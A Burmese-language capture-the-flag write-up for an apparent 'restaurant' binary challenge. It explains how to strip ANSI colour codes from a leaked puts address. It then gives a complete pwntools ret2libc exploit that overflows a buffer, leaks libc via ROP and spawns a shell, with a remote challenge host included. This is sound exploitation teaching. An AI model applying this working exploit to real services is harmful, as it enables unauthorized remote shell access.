
ဘာလို့ဆို ဒီမှာ ANSI Color Codes ကိုသုံးထားတယ်  (Terminal မှာ စာသားတွေ ပေါ်လာတဲ့အခါ အချို့စာသားတွေက အပြာရောင်၊ အဝါရောင်၊ သို့မဟုတ် အနီရောင် (Bold) စသဖြင့် လှလှပပ ပေါ်လာတာ)


Program ဘက်ကနေ Screen ပေါ်ကို စာသားလှလှလေး ပြချင်ရင် ဥပမာ - `\x1b[1;36m🥡 Welcome...` ဆိုပြီး ပို့လိုက်တယ်
- `\x1b[1;36m` ဆိုတာ "နောက်ကစာသားကို Cyan (အပြာနုရောင်) ပြောင်းပါ" လို့ Terminal ကို အမိန့်ပေးတဲ့ ကုဒ် ဖြစ်တယ်
- Terminal က ဒီကုဒ်ကို မြင်ရင် စာအဖြစ် မပြတော့ဘဲ အရောင်ပဲ ပြောင်းပစ်လိုက်တယ်
Python Script (`pwntools`) က `io.recvline()` နဲ့ data ကို ဖတ်တဲ့အခါ သူက လူလို မျက်စိနဲ့ ကြည့်တာမဟုတ်ဘဲ binary bytes အတိုင်း အကုန်သိမ်းတာ ဒါကြောင့် Terminal က ဖျောက်ထားတဲ့ `\x1b[1;36m` ဆိုတဲ့ byte တွေကိုပါ Python က အကုန်သိမ်းမိသွားတယ်


ဆိုတော့ ငါတို့ ငါတို့ လိုချင်တဲ့ byte ကိုရှာယူမှဖြစ်မယ်
```
[ Binary က ပို့လိုက်တဲ့ Data ပုံစံ ]
\x1b  [  1  ;  3  6  m  \x60  \x0e  \x68  \xe3  \xfb  \x7f  \n
|____________________|  |______________________________|
   ANSI Color Code                Memory Address အစစ်
```



Linux x64 System တွေမှာ User Space (ပရိုဂရမ်တွေ ပုံမှန် run တဲ့နေရာ) ရဲ့ Memory Address တွေဟာ အမြဲတမ်း **`0x7f`** နဲ့ စလေ့ရှိတယ်(ဥပမာ- `0x7ffbe3680e60`)
Little-Endian စနစ်အရ memory ထဲမှာ သိမ်းတဲ့အခါ ပြောင်းပြန်သိမ်းလို့ `0x7f` က အနောက်ဆုံးမှာ ရောက်နေတတ်တယ်
 Memory address ပုံစံ: `\x60\x0e\x68\xe3\xfb\x7f`
စာသားတွေ ဘယ်လောက်ပဲ ရှုပ်နေပါစေ... `\x7f` ပါတဲ့ နေရာကို အရင်ရှာမယ်။ တွေ့ပြီဆိုရင် အဲဒီ `\x7f` နဲ့ သူ့အရှေ့က ၅ လုံး (စုစုပေါင်း ၆ လုံး) ကိုပဲ ကွက်တိ ဖြတ်ယူမယ်
အဲဒီလို ဖြတ်ယူပြီးမှ `u64()` နဲ့ unpack လုပ်ပြီး `ljust(8, b'\x00')` နဲ့ byte ၈ လုံးပြည့်အောင် ဖြည့်လိုက်တဲ့အတွက် မင်းရဲ့ terminal မှာ `0x7ffbe3680e60` ဆိုတဲ့ လိပ်စာအစစ်



```python
from pwn import *


context.log_level = 'debug'
context.binary = "./restaurant"
elf = context.binary

def start():
    if args.R:
        return remote("154.57.164.82", 32310)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            
            b *0x0000000000400e9d         
            continue
        ''')
    else:
        return process(elf.path)



def findputs(io):
    payload = ...
    payload = b'A' * 40
    payload += p64(0x00000000004010a3)
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"> ")
    io.sendline(payload)
    io.recvuntil(b"Enjoy your ")
    io.recv(40)
    raw_data = io.recvline()
    
    # ANSI Color escape codes တွေကို ဖယ်ထုတ်ပစ်တာ (ဥပမာ- \x1b[1;36m စတာတွေ)
    # လိပ်စာအစစ်က 0x7f နဲ့ စမှာဖြစ်လို့ အဲဒီ byte ကနေစပြီး 6 bytes ကိုပဲ ဖြတ်ယူမယ်
    if b'\x7f' in raw_data:
        # \x7f ကနေ စပြီး နောက်ထပ် 6 bytes ကို ယူတယ်
        idx = raw_data.index(b'\x7f')
        # x64 address က များသောအားဖြင့် 6 bytes ရှိပြီး ကျန်တာ \x00 တွေဖြစ်တယ်
        # ဒါကြောင့် \x7f ပါတဲ့နေရာကနေ နောက်ပြန် (သို့) ရှေ့တိုး ၆ လုံး ဖြတ်ယူမယ်
        leaked_bytes = raw_data[idx-5 : idx+1] # \x7f က အနောက်ဆုံးမှာ ရှိတတ်လို့ပါ
    else:
        # အပေါ်က အဆင်မပြေရင် generic နည်းလမ်းနဲ့ strip လုပ်ပြီး ၆ လုံးပဲ ဖြတ်မယ်
        # \x1b စတဲ့ non-printable တွေကို ဖယ်ဖို့ဖြစ်တယ်
        leaked_bytes = raw_data.replace(b'\x1b[1;36m', b'').replace(b'\x1b[0m', b'').strip()[:6]

    # 4. ရလာတဲ့ byte data ကို 8-byte ဖြစ်အောင် padding ပေးပြီး unpack လုပ်မယ်
    puts_libc = u64(leaked_bytes.ljust(8, b'\x00'))
    
    print("\n" + "="*40)
    print(f"[+] Leaked puts@libc address: {hex(puts_libc)}")
    print("="*40 + "\n")
    return puts_libc

def getshell(io, system, binsh):
    payload = b'A' * 40
    payload += p64(0x000000000040063e)
    payload += p64(0x00000000004010a3)
    payload += p64(binsh)
    payload += p64(system)
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"> ")
    io.sendline(payload)
    io.clean()
    io.interactive()


if __name__ == '__main__':
    io = start()
    putslibc = findputs(io)
    libc_base = putslibc - 0x0000000000080aa0
    system = libc_base + 0x000000000004f550
    binsh = libc_base + 0x1b3e1a
    getshell(io, system, binsh)
```

